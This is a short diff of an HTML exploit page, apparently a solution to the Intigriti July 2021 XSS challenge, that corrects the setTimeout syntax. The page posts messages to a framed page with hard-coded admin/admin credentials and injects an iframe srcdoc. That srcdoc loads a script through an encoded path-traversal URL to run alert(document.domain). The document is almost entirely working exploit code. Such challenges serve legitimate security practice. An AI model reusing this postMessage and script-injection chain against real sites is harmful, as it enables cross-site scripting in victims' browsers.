@@ -19,11 +19,11 @@ https://challenge-0721.intigriti.io/htmledit.php?code=%3Ciframe%20srcdoc=%22%20%
 	aaaa
 	<script type="text/javascript">
 		window.onload = ()=>{
-			setTimeout()=>{
-			top.frames[1].postMessage({credentials:{username:"admin",password:"admin"},cmd:"log",message:{text:"sss",type:"<iframe srcdoc='<script src=\"./analytics%2f..%2fhtmledit.php?code=%0Aalert(document.domain)/*%0A\">alert()/*<\/script>'><\/iframe>"}}, '*');
+			setTimeout(()=>{
+					top.frames[1].postMessage({credentials:{username:"admin",password:"admin"},cmd:"log",message:{text:"sss",type:"<iframe srcdoc='<script src=\"./analytics%2f..%2fhtmledit.php?code=%0Aalert(document.domain)/*%0A\">alert()/*<\/script>'><\/iframe>"}}, '*');
 
 			top.frames[1].postMessage({credentials:{username:"admin",password:"admin"},cmd:"logv",message:"type"}, '*');
-			,3000}
+			},3000)
 		}
 	</script>
 </body>
